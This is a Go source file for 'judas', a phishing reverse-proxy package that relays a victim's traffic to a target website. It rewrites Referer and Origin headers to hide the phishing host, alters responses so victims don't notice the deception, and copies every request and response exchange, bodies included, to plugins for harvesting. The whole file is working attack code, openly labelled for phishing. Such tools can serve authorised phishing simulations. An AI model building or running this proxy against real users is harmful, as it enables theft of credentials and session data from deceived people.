package judas

import (
	"context"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
)

// phishingProxy proxies requests between the victim and the target, queuing requests for further processing.
// It is meant to be embedded in a httputil.ReverseProxy, with the Director and ModifyResponse functions.
type phishingProxy struct {
	TargetURL            *url.URL
	ResponseTransformers []ResponseTransformer
	Logger               *log.Logger
}

// Director updates a request to be sent to the target website
func (p *phishingProxy) Director(request *http.Request) {
	request.URL.Scheme = p.TargetURL.Scheme
	request.URL.Host = p.TargetURL.Host
	request.Host = p.TargetURL.Host

	// Don't let a stray referer header give away the location of our site.
	// Note that this will not prevent leakage from full URLs.
	referer := request.Referer()
	if referer != "" {
		referer = strings.Replace(referer, request.Host, p.TargetURL.Host, -1)
		request.Header.Set("Referer", referer)
	}

	if _, ok := request.Header["User-Agent"]; !ok {
		// explicitly disable User-Agent so it's not set to default value
		request.Header.Set("User-Agent", "")
	}

	// Don't let a stray origin header give us away either.
	origin := request.Header.Get("Origin")
	if origin != "" {
		origin = strings.Replace(origin, request.Host, p.TargetURL.Host, -1)
		request.Header.Set("Origin", origin)
	}

	// Go supports gzip compression, but not Brotli.
	// Since the underlying transport handles compression, remove this header to avoid problems.
	request.Header.Del("Accept-Encoding")
}

// ModifyResponse updates a response to be passed back to the victim so they don't notice they're on a phishing website.
func (p *phishingProxy) ModifyResponse(response *http.Response) error {
	for _, transformer := range p.ResponseTransformers {
		err := transformer.Transform(response)
		if err != nil {
			return err
		}
	}

	return nil
}

// InterceptingTransport sends the HTTP exchange to the loaded plugins.
type InterceptingTransport struct {
	http.RoundTripper
	Plugins   *PluginBroker
	TargetURL *url.URL
}

// RoundTrip executes the HTTP request and sends the exchange to judas's loaded plugins
func (t *InterceptingTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	resp, err := t.RoundTripper.RoundTrip(req)
	if err != nil {
		return nil, err
	}

	// If we haven't loaded any plugins, don't bother cloning the request or anything.
	if t.Plugins == nil {
		return resp, nil
	}

	request := &Request{Request: req}
	clonedRequest, err := request.CloneBody(context.Background())
	if err != nil {
		return nil, err
	}

	response := &Response{Response: resp}
	clonedResponse, err := response.CloneBody()
	if err != nil {
		return nil, err
	}

	httpExchange := &HTTPExchange{
		Request:  clonedRequest,
		Response: clonedResponse,
		Target:   t.TargetURL,
	}

	err = t.Plugins.SendResult(httpExchange)
	return resp, err
}

// ProxyServer exposes the reverse proxy over HTTP.
type ProxyServer struct {
	reverseProxy *httputil.ReverseProxy
	logger       *log.Logger
}

// HandleRequests reverse proxies all traffic to the target server.
func (p *ProxyServer) HandleRequests(w http.ResponseWriter, r *http.Request) {
	p.reverseProxy.ServeHTTP(w, r)
}

// New returns a HTTP handler configured for phishing.
func New(config *Config) *ProxyServer {
	phishingProxy := &phishingProxy{
		TargetURL:            config.TargetURL,
		ResponseTransformers: config.ResponseTransformers,
		Logger:               config.Logger,
	}

	reverseProxy := &httputil.ReverseProxy{
		Director:       phishingProxy.Director,
		ModifyResponse: phishingProxy.ModifyResponse,
		Transport:      config.Transport,
	}

	return &ProxyServer{
		reverseProxy: reverseProxy,
		logger:       config.Logger,
	}
}
